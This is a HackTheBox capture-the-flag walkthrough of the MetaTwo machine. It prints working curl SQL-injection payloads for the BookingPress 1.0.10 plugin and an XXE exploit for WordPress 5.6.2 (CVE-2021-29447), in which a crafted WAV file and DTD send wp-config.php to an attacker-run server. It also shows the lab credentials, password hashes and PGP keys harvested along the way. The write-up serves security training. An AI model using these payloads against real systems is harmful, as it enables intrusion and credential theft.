---
title: "MetaTwo: A look at hacking WordPress, SQLi, XXE on HackTheBox"
pubDatetime: 2022-12-16T16:34:45Z
slug: "metatwo-hackthebox-wordpress-sql-injection-xxe"
featured: false
draft: false
commentsEnabled: false
categories:
  - Cybersecurity
  - HackTheBox
  - PHP
  - SQL
tags:
  - HTB
  - Hack The Box
  - Hard Box
  - Web
  - Vulnerability Assessment
  - Databases
  - Injection
  - Common Applications
  - Protocols
  - Outdated Software
  - Wordpress
  - MySQL
  - NGINX
  - FTP
  - PHP
  - Reconnaissance
  - Password Cracking
  - Brute Force Attack
  - SQL Injection
  - Weak Credentials
  - Clear Text Credentials
  - XXE Injection
ogImage: "./images/MetaTwo.png"
description: "A deep-dive walkthrough of MetaTwo, a challenge box on HTB (HackTheBox) focused on WordPress, SQL Injection and XML External Entity exploitation."
---

![MetaTwo](./images/MetaTwo.png "MetaTwo Screenshot")

## Introduction

In the sprawling landscape of cybersecurity, we often encounter a variety of digital fortresses — each with their unique layers of protection. MetaTwo is one such system. In this post, we will take a look into how we approach the penetration testing (pen-testing) of such a system.

## Reconnaissance: The Art of Information Gathering

In the realm of cybersecurity, reconnaissance plays a key role. It is the initial phase where we attempt to gather as much information about the target as possible, often employing tools like `nmap`.

### Nmap Scan: Revealing the Open Ports

`nmap` is a free and open-source network scanner designed to discover hosts, services, and open ports to construct a "map" of the network. In our case, it helped identify the open ports on the MetaTwo system. Here's the nmap command and the corresponding result:

```bash
nmap 10.129.228.95
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 15:57 GMT
Nmap scan report for metatwo.htb (10.129.228.95)
Host is up (0.016s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.03 seconds
```

Our `nmap` scan reveals that there are 3 open ports. The HTTP port (80/tcp), in particular, is interesting because when accessed through a web browser, it redirects to `metapress.htb`. Therefore, I added that to our hosts file:

```bash
echo "10.129.228.95 metapress.htb" >> /etc/hosts
```

Upon visiting the newly assigned URL, we are able to see the contents served over HTTP. The URL is: http://metapress.htb/.

## A Deep Dive into WordPress Exploitation

Our reconnaissance revealed that we are dealing with a WordPress site. WordPress, being a popular content management system, is frequently a target of exploits due to its history of vulnerabilities and the susceptibility of its various plugins.

### Analysis of the WordPress Site

![Metapress.htb](./images/Untitled.png "Metapress.htb Screenshot")

I made a list of all the available pages by submitting an empty search. A careful inspection of these pages provided us with several potential avenues for investigation, such as possible vulnerable plugins or potential forms of payment systems.

Here is a list of the discovered pages:

- http://metapress.htb/events/ - includes some booking/calandar form flow (could be a vulnerable plugin?)
- http://metapress.htb/about-us/ - nothing of note
- http://metapress.htb/cancel-payment/ - A page for payment errors, hints at some form of payment system
- http://metapress.htb/cancel-appointment/ - page for cancelled appointment mesage
- http://metapress.htb/thank-you/ - appointment booking success page. Renders details of appointment (service, date/time, customer name) - maybe we can render something here if we get RCE?
- http://metapress.htb/sample-page/ - sample page, contains a link to the wp-admin portal (http://metapress.htb/wp-login.php?redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&reauth=1)
- http://metapress.htb/hello-world/ - welcome page - enumerates an `admin` username as the author

A look into the source code and searching for `generator` revealed that the site was built on `WordPress version 5.6.2`, utilising the `bookingpress v1.0.10 plugin` and `twentytwwentyone v1.1 theme`. With these details, we were able to investigate known vulnerabilities:

```html
<meta name="generator" content="WordPress 5.6.2" />
```

Just above that line we can also see that it's using the `bookingpress v1.0.10` plugin for the appointment booking system.

And the theme is `twentytwwentyone v1.1.`

---

![WordPress BookingPress Plugin Exploit](./images/Untitled_1.png "WordPress BookingPress Plugin Exploit")

A critical SQL Injection vulnerability was found in the WordPress BookingPress Plugin v1.0.10, discovered and reported by cydave. The vulnerability could allow an attacker to interact directly with your database — stealing information or creating new administrator accounts. This issue was patched in version 1.0.11.

Read more about the vulnerability [here](https://patchstack.com/database/vulnerability/bookingpress-appointment-booking/wordpress-bookingpress-plugin-1-0-10-unauthenticated-sql-injection-sqli-vulnerability).

```bash
## https://sploitus.com/exploit?id=WPEX-ID:388CD42D-B61A-42A4-8604-99B812DB2357
- Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
- Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
- Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for "action:'bookingpress_front_get_category_services'")
- Invoke the following curl command

curl -i 'https://example.com/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

Time based payload: curl -i 'https://example.com/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH'
```

### Launching an SQL Injection Exploit

SQL Injection is a code injection technique that attackers can use to insert malicious SQL statements into input fields for execution by the underlying SQL database. In our case, this is precisely the vulnerability present in the BookingPress Plugin.

As instructed in the exploit lets grab the nonce from the events source code.

![metapress.htb source code](./images/Untitled_2.png "metapress.htb source code")

`_wpnonce:'b0def982ab'`
`b0def982ab`

Next we use it in the following command to test if it works:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=b0def982ab&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

```bash
┌──(root㉿kali)-[/home/dan/HTB/metatwo]
└─# curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=b0def982ab&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 15 Dec 2022 16:23:23 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Looks like it works, we’ve managed to enumerate the database a bit.

Next we can try querying the users table by altering the SQLi request:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=b0def982ab&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,1,2,3,4,5,6 from wp_users-- -'
```

```json
[
  {
    "bookingpress_service_id": "admin",
    "bookingpress_category_id": "admin@metapress.htb",
    "bookingpress_service_name": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg"
  },
  {
    "bookingpress_service_id": "manager",
    "bookingpress_category_id": "manager@metapress.htb",
    "bookingpress_service_name": "$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg"
  }
]
```

So we’ve got 2 users, emails, and passwords.

- **admin** - `admin@metapress.htb` - `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
- **manager** - `manager@metapress.htb` - `$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70`

After successfully extracting the usernames, emails, and password hashes of two users, I attempted to crack the hashes. I achieved this by using John the Ripper, a popular password cracking tool.

Add hashes to a file:

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ vim hashes
```

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ cat hashes
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

Attempt crack:

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)
```

Looks like we got a login!

`manager` : `partylikearockstar`

The result? We obtained the password for the 'manager' account: partylikearockstar. With these credentials, we can now attempt to log into the WordPress admin panel.

## Exploiting WordPress Admin Privileges

### WP Admin panel as manager

![WP Admin panel](./images/Untitled_3.png "WP Admin panel")

Armed with the newly obtained 'manager' credentials, I managed to gain access to the WordPress (WP) admin panel, revealing that this user has the ability to upload new media.

![Upload screen](./images/Untitled_4.png "Upload Screen")

### Identifying Vulnerabilities

It's essential to point out that the WordPress version we're dealing with is 5.6.2, which is known to be vulnerable to XML External Entity (XXE) exploitation (`CVE-2021-29447`). If you're interested, you can read more about the vulnerability and the affected versions [here](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/).

> WordPress versions 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11 are affected to XML eXternal Entity vulnerability where an authenticated user with the ability to upload files in the Media Library can upload a malicious WAVE file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).

### Crafting an XXE Attack

To exploit this vulnerability, I decided to craft a malicious WAVE file that would call a HTTP server on our machine and pass it a malicious file containing Remote Code Execution (RCE) XML.

Our payload aimed to grab the `wp-config.php` file, which is crucial because it contains sensitive information such as database connection settings.

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ cat payload.dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.99/?p=%file;'>" >
```

Craft the malicious WAV file:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.99/payload.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Start our webserver:

```bash
python3 -m http.server 80
```

After creating the malicious WAVE file and initiating our web server, we are ready to upload our WAV file.

![Upload screen](./images/Untitled_5.png "Upload screen")

This should trigger a response on our listening server:

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.95 - - [15/Dec/2022 22:38:49] "GET /payload.dtd HTTP/1.1" 200 -
10.129.228.95 - - [15/Dec/2022 22:38:49] "GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1" 200 -
```

### Decoding the Response

The next part was decoding the response to obtain the PHP file. Once decoded, it provided us with some precious credentials for further exploitation.

```bash
echo -n 'PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==' | base64 -d
```

Giving us the decoded PHP file:

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Excellent we now have some credentials.

Database: `blog::635Aq@TdqrCwXFUZ`

FTP: `metapress.htb::9NYS_ii@FyL_p5M2NvJ` - `ftp.metapress.htb`

## System Exploitation and SSH Access

### FTP Exploration and Exploitation

The credentials obtained allow us to connect to an FTP server and rummage around its contents. I found a PHP file in the mailer folder which provided us with further credentials for an email server.

```bash
┌──(dan㉿kali)-[~/HTB/metatwo]
└─$ ftp metapress.htb@metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||8957|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd ../mailer
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||25853|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||62458|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |*****************************************************************************************|  1126      698.60 KiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (61.62 KiB/s)
```

![metapress.htb source code](./images/Untitled_6.png ")

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
$mail->SMTPSecure = "tls";
$mail->Port = 587;
```

Looks like we got some more credentials, this time for an email server.

`jnelson@metapress.htb::Cb4_JmWM8zUZWMu@Ys`

Let's try and SSH into the server with these credentials.

### SSH Access and User Flag

![metapress.htb source code](./images/Untitled_7.png)

With the new credentials in hand, we are able to establish an SSH connection. However, this user does not have any root commands, necessitating further enumeration.

I first checked for the user flag and found it. However, the journey didn't end there.

```bash
jnelson@meta2:~$ ls
user.txt
jnelson@meta2:~$ cat user.txt
757c1f16eecb41bc07b7d84218a4a40a
```

### Unlocking PGP Keys and Cracking the Password

Upon further exploration, I discovered a hidden folder named `.passpie` in the user's home. This folder contained a PGP pair of public and private keys. After extracting the private key and cracking the password with John the Ripper, I managed to obtain the password: `blink182`.

```shell
jnelson@meta2:~/.passpie$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG
WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw
8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh
cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML
qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j
FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH
FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE
PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM
FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L
/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y
q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+
